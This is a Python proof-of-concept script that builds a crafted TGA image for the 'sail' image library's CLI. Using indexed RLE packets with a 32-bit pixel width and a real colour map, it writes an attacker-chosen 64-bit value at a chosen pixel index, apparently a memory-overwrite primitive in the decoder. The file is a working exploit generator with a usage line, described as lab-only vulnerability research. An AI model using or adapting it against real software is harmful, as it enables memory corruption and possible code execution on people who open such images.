#!/usr/bin/env python3
"""Local TGA, same 16x16 indexed-RLE bpp=32 sink, but with a real color map so
the shipped sail CLI can finish decoding. One chosen dword lands at a chosen
4-byte-stride pixel index. descriptor=0x20 disables the post-decode vertical
mirror. Lab-only; does not touch the witness pins.

usage: make-palette-poc.py OUT.tga VICTIM_INDEX LOW32 HIGH32 [BPP]
BPP=32 (default) writes 4 bytes per pixel; BPP=8 is the safe stride.
"""
import struct
import sys

out_path, index_s, low_s, high_s = sys.argv[1:5]
bpp = int(sys.argv[5]) if len(sys.argv) > 5 else 32
victim_index = int(index_s)
low = int(low_s, 16) & 0xFFFFFFFF
high = int(high_s, 16) & 0xFFFFFFFF

# id_length, color_map_type=1, image_type=9, first=0, len=4, entry=24 bits
hdr = bytes([0, 1, 9]) + struct.pack("<HHB", 0, 4, 24)
hdr += struct.pack("<HH", 0, 0) + struct.pack("<HH", 16, 16)
hdr += bytes([bpp, 0x20])
palette = b"\x11\x22\x33" * 4

packets = []


def runs(total, value):
    while total > 0:
        count = min(128, total)
        packets.append((count, value))
        total -= count


runs(victim_index, 0x11223344)
packets.append((1, low))
packets.append((1, high))
runs(256 - victim_index - 2, 0x5A5A5A5A)

width = bpp // 8
body = b"".join(bytes([0x80 | (count - 1)]) +
                (value & ((1 << (width * 8)) - 1)).to_bytes(width, "little")
                for count, value in packets)

with open(out_path, "wb") as f:
    f.write(hdr + palette + body)

print(f"wrote {out_path} bytes={len(hdr)+len(palette)+len(body)} index={victim_index} "
      f"value=0x{high:08x}{low:08x} packets={len(packets)}")
